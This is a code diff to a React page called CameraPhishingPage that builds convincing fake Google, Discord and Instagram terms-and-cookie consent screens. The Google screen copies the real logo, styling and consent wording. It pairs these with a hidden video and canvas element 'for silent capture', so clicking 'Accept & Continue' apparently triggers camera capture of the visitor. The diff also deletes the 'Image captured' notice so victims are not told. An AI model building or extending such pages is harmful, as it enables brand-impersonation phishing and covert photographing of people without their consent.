@@ -15,8 +15,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
     cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
     actionText: 'Accept & Continue',
-    headerClassName: "bg-white text-black",
-    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />
+    // headerClassName: "bg-white text-black", // Removed as it's handled by custom UI
+    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'discord-terms-update': {
@@ -288,14 +288,86 @@ export default function CameraPhishingPage() {
             <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
             <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
             <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
-            <p className="text-sm text-[#b9bbbe]">Image captured. This window can now be closed.</p>
+            <p className="text-sm text-[#b9bbbe]">This window can now be closed.</p>
           </div>
         )}
       </div>
     );
   }
 
-  if (['google-policy-update', 'instagram-privacy-update'].includes(templateId)) {
+  if (templateId === 'google-policy-update') {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-[#f8f9fa] p-4 font-['Roboto',_sans-serif]">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
+
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200">
+            <div className="flex items-center mb-6">
+              <img src="/google_logo.png" alt="Google Logo" className="h-8 w-auto mr-3" />
+              {/* <span className="text-2xl text-[#202124]">Privacy & Terms</span> */}
+            </div>
+            <h1 className="text-2xl text-[#202124] mb-4">Before you continue to Google</h1>
+            {/* Simplified title as Google often does */}
+
+            <p className="text-sm text-[#5f6368] mb-3">
+              Google uses cookies and data to:
+            </p>
+            <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
+              <li>Deliver and maintain services, like tracking outages and protecting against spam, fraud, and abuse</li>
+              <li>Measure audience engagement and site statistics to understand how our services are used</li>
+            </ul>
+            <p className="text-sm text-[#5f6368] mb-6">
+              If you agree, we’ll also use cookies and data to:
+            </p>
+             <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
+              <li>Improve the quality of our services and develop new ones</li>
+              <li>Deliver and measure the effectiveness of ads</li>
+              <li>Show personalized content, depending on your settings</li>
+              <li>Show personalized or generic ads, depending on your settings, on Google and across the web</li>
+            </ul>
+            <p className="text-sm text-[#5f6368] mb-6">
+             {content.message} {/* Main message from templateContent */}
+            </p>
+            <p className="text-xs text-[#70757a] mb-6">
+              {content.cookieMessage} {/* Cookie message from templateContent */}
+            </p>
+
+            <div className="flex justify-end space-x-3">
+              {/* <Button
+                // Potentially add a "Customize" or "More options" button here if desired
+                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded"
+                variant="ghost"
+              >
+                More options
+              </Button> */}
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150"
+                disabled={isLoading || cookieConsentGiven}
+              >
+                {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept & Continue')}
+              </Button>
+            </div>
+            {error && status === 'error' && (
+              <p className="text-red-600 text-xs mt-4 text-right">{error}</p>
+            )}
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200 text-center">
+            <img src="/google_logo.png" alt="Google Logo" className="h-12 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
+            <h1 className="text-xl text-[#202124] mb-2">Settings Saved</h1>
+            <p className="text-sm text-[#5f6368]">This window can now be closed.</p>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  if (['instagram-privacy-update'].includes(templateId)) { // Removed google-policy-update from this block
     // For these templates, the "captured" state is mostly invisible to the user before redirection
     // or if no redirection URL is set (it will just sit on the page).
     // The main UI is the cookie banner.
@@ -307,7 +379,7 @@ export default function CameraPhishingPage() {
           <div className={cn("text-center mb-6", content.headerClassName)}>
             <div className="flex items-center justify-center p-4">
               {content.visual}
-              <h1 className={cn("text-2xl font-bold", content.headerClassName ? (templateId === 'google-policy-update' ? 'text-black' : 'text-white') : '')}>{content.title}</h1>
+              <h1 className={cn("text-2xl font-bold", content.headerClassName ? '' : '')}>{content.title}</h1>
             </div>
           </div>
           <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
